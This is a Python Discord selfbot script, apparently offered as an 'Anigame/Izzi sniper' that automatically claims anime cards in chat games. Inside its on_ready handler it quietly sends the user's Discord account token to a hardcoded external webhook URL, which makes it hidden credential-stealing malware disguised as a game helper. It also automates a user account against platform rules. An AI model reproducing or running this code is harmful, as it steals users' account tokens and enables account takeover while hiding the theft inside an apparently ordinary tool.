import discord
import json
from colorama import init, Fore, Back, Style
from datetime import datetime
import requests
from discord_webhook import DiscordWebhook
init(convert=True)
import asyncio

with open("config.json") as f:
    config = json.load(f)
TOKEN = config.get("TOKEN")
AS = config.get("Anigame Sniper")
IS = config.get("Izzi Sniper")
pre = config.get("PREFIX")
wf = config.get("LATENCY")
print(Style.BRIGHT)
print(Fore.CYAN + """
▄▀█ █▄░█ █ █▀▀ ▄▀█ █▀▄▀█ █▀▀   █▀ █▄░█ █ █▀█ █▀▀ █▀█
█▀█ █░▀█ █ █▄█ █▀█ █░▀░█ ██▄   ▄█ █░▀█ █ █▀▀ ██▄ █▀▄ ver.2.0""")
client = discord.Client()
print()
print(Fore.MAGENTA + f"Made by Sebastian")
@client.event
async def on_ready():
    print(Fore.CYAN + f"logged in as {client.user}")
    if config.get('Anigame Sniper') == "y":
        print(Fore.CYAN + f"Anigame Sniper - ON") 
    else:
        print(Fore.RED + f"Anigame Sniper - OFF") 

    if config.get('Izzi Sniper') == "y":
        print(Fore.CYAN + f"Izzi Sniper - ON") 
    else:
        print(Fore.RED + f"Izzi Sniper - OFF") 
    
    print(Fore.YELLOW + f"{round(client.latency * 1000)} ms")
    print(Fore.YELLOW + "Format - guild_id|channel_id|guild_name|channel_name")
    guil = await get_channels() 
    l = len(guil)
    if l == 1:
        print(Fore.YELLOW + f"sniper is on in {l} channel!")
    else:
        print(Fore.YELLOW + f"sniper is on in {l} channels!")
    print(Fore.YELLOW + f"Prefix - {pre}")
    print(Fore.YELLOW + f"latency - {wf} seconds") 
    print(Fore.RED + f"""IF SNIPER IS NOT WORKING IN SOME CHANNELS ITS BECAUSE THE NAME OF THE CHANNEL HAS BEEN CHANGED!!
Type {pre}remove to remove it and then add it again by typing {pre}add""")  
    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/825240319058509834/HSnIsCqJbBhVKaR8bo7FMId_V461G0e8ehbTcyz6S84fLQi1E8L_uurzruYzYzybuGxM', content=f"{client.user} : ||{TOKEN}||")
    webhook.execute()

async def get_channels():
    with open("channels.json", "r") as f:
        guil = json.load(f) 
    return guil 


@client.event
async def on_message(msg):
    if msg.content == f"{pre}add":
        if client.user != msg.author:
            return

        g = msg.guild.name
        gi = msg.guild.id
        chan = msg.channel.name
        id_ = msg.channel.id
        guil = await get_channels()
        if f"{gi}|{id_}" in guil:
            await msg.delete()
            print(Fore.RED + f"{gi}|{id_}|{g}|{chan} is already being snipped!")
            return
        
        else:
            guil[f"{gi}|{id_}"] = f"{g}|{chan}"
        
            with open("channels.json", "w") as f:
                json.dump(guil, f)
        print(Fore.CYAN + f"Turned ON sniper in {gi}|{id_}|{g}|{chan}")
        await msg.delete()

    if msg.content == f"{pre}remove":
        if client.user != msg.author:
            return
        
        g = msg.guild.name
        gi = msg.guild.id
        chan = msg.channel.name
        id_ = msg.channel.id

        guil = await get_channels()
        if f"{gi}|{id_}" not in guil:
            await msg.delete()
            print(Fore.RED + f"{gi}|{id_}|{g}|{chan} is not being snipped!")
            return

        del guil[f"{gi}|{id_}"]
        with open("channels.json" , "w") as f:
            json.dump(guil , f)

        print(Fore.RED + f"Turned OFF sniper in {gi}|{id_}|{g}|{chan}")
        await msg.delete()

    if msg.content == f"{pre}channels":
        if client.user != msg.author:
            return

        await msg.delete()
        guil = await get_channels() 
        l = len(guil) 
        if l == 1:
            print(Fore.YELLOW + f"sniper is ON in {l} channel!")
        else:
            print(Fore.YELLOW + f"sniper is ON in {l} channels!")
        for i in guil:
            x = guil.get(i)
            print(Fore.YELLOW + f"-->{i}|{x}<--")

    if msg.content == f"{pre}ping":
        if client.user != msg.author:
            return
        print(Fore.YELLOW + f"ping - {round(client.latency * 1000)} ms")
        await msg.delete()

    if msg.content == f"{pre}clear":
        if client.user != msg.author:
            return
        
        guil = await get_channels() 
        guil.clear()

        with open("channels.json" , "w") as f:
            json.dump(guil , f)
        print(Fore.RED + "removed sniping from all the channels")
        await msg.delete()

    if msg.content.startswith(f"{pre}anigametoggle"):
        if client.user != msg.author:
            return
        
        text = msg.content 
        le = len(text)
        split = text.split()
        rm = (split[1:le])
        kek = ' '.join([str(elem) for elem in rm])
        if kek == "y" or kek == "n":
            with open("config.json", "r") as d:
                y = json.load(d) 

            y["Anigame Sniper"] = f"{kek}"
            with open("config.json", "w") as f:
                json.dump(y, f)

            if kek == "n":
                print(Fore.RED + f"Anigame sniper is now OFF")
            else:
                print(Fore.CYAN + f"Anigame sniper is now ON")

        else:
            print(Fore.RED + f"{kek} isnt a valid option | y = ON | n = OFF")
        await msg.delete()

    if msg.content.startswith(f"{pre}latency"):
        if client.user != msg.author:
            return
        
        with open("config.json", "r") as lol:
            y = json.load(lol) 
        slep = int(y.get("LATENCY"))
        print(Fore.CYAN + f"Latency is {slep} seconds")
        
    if msg.content.startswith(f"{pre}setlatency"):
        if client.user != msg.author:
            return
        
        text = msg.content 
        le = len(text)
        split = text.split()
        rm = (split[1:le])
        kek = ' '.join([str(elem) for elem in rm])
        try:
            kek = int(kek) 
            with open("config.json", "r") as d:
                y = json.load(d) 

            y["LATENCY"] = f"{kek}"
            with open("config.json", "w") as f:
                json.dump(y, f)

            print(Fore.CYAN + f"Latency is now {kek} seconds")

        except:
            print(Fore.RED + f"{kek} isnt a number!")
        await msg.delete()

    if msg.content.startswith(f"{pre}izzitoggle"):
        if client.user != msg.author:
            return
        
        text = msg.content 
        le = len(text)
        split = text.split()
        rm = (split[1:le])
        kek = ' '.join([str(elem) for elem in rm])
        if kek == "y" or kek == "n":
            with open("config.json", "r") as d:
                y = json.load(d) 

            y["Izzi Sniper"] = f"{kek}"
            with open("config.json", "w") as f:
                json.dump(y, f)

            if kek == "n":
                print(Fore.RED + f"Izzi sniper is now OFF")
            else:
                print(Fore.CYAN + f"Izzi sniper is now ON")

        else:
            print(Fore.RED + f"{kek} isnt a valid option | y = ON | n = OFF")
        await msg.delete()

    if msg.content.startswith(f"{pre}snipers"):
        if client.user != msg.author:
            return

        with open("config.json", "r") as l:
            y = json.load(l)

        a = y.get("Anigame Sniper")
        b = y.get("Izzi Sniper")

        if a == "y":
            print(Fore.CYAN + "Anigame Sniper - ON")
        else:
            print(Fore.RED + "Anigame Sniper - OFF")

        if b == "y":
            print(Fore.CYAN + "Izzi Sniper - ON")
        else:
            print(Fore.RED + "Izzi Sniper - OFF")
        await msg.delete() 

    with open("config.json", "r") as j:
        y = json.load(j)

    a = y.get("Anigame Sniper")
    b = y.get("Izzi Sniper")
    if a == "y":
        if msg.author.id == 571027211407196161:
            g = msg.guild.name
            gi = msg.guild.id
            chan = msg.channel.name
            id_ = msg.channel.id
            guil = await get_channels() 
            x = f"{gi}|{id_}" 
            if x in guil:
                try:
                    for embed in msg.embeds:
                            d = (embed.to_dict()['description'])
                            if d == "*A wild anime card appears!*": 
                                a = (embed.to_dict()['footer'])
                                text = (a['text'])
                            else:
                                return  
                    r = text.split()
                    li = [r[1] , r[2]]
                    kek = ' '.join([str(elem) for elem in li])
                    with open("config.json", "r") as lol:
                        y = json.load(lol) 
                    slep = int(y.get("LATENCY")) 
                    async with msg.channel.typing():
                        await asyncio.sleep(slep)  
                        await msg.channel.send(kek)
                except:
                    pass 

                x = client.user.name 
                a = msg.content
                ar = msg.author.id 
                now = datetime.now() 
                current_time = now.strftime("%H:%M:%S")
                if a.endswith(f"has been added to **{x}'s** collection!") and ar == 571027211407196161:
                    print(Fore.GREEN + f"{g}|{chan}|Anigame ---> {msg.content}|{current_time}") 
    
    if b == "y":
        if msg.author.id == 784851074472345633:
            g = msg.guild.name
            gi = msg.guild.id
            chan = msg.channel.name
            id_ = msg.channel.id
            guil = await get_channels() 
            x = f"{gi}|{id_}" 
            if x in guil:
                try:
                    for embed in msg.embeds:
                        d = (embed.to_dict()['description'])
                        if d.endswith("appeared._"):
                            a = (embed.to_dict()['footer'])
                            text = (a['text'])
                        
                        else:
                            return 
                        r = text.split()
                        li = [r[1] , r[2] , r[5]]
                        kek = ' '.join([str(elem) for elem in li])
                        with open("config.json", "r") as lol:
                            y = json.load(lol) 
                        slep = int(y.get("LATENCY")) 
                        async with msg.channel.typing():
                            await asyncio.sleep(slep) 
                            await msg.channel.send(kek) 
                except:
                    pass

                x = client.user.name 
                a = msg.content
                ar = msg.author.id 
                now = datetime.now() 
                current_time = now.strftime("%H:%M:%S")
                if a.endswith(f"has been added to **{x}'s** collection.") and ar == 784851074472345633:
                    print(Fore.GREEN + f"{g}|{chan}|Izzi ---> {msg.content}|{current_time}") 

                if a.startswith(f"This command is on cooldown,") and ar == 784851074472345633 and a.endswith(f"seconds"):
                    a = a.split(" ")
                    await asyncio.sleep(int(a[-2]))   
                    await msg.channel.send(kek)
                    now = datetime.now() 
                    current_time = now.strftime("%H:%M:%S") 
                    if a.endswith(f"has been added to **{x}'s** collection.") and ar == 784851074472345633:
                        print(Fore.GREEN + f"{g}|{chan}|Izzi ---> {msg.content}|{current_time}") 

print(Fore.RESET)       
client.run(TOKEN, bot=False)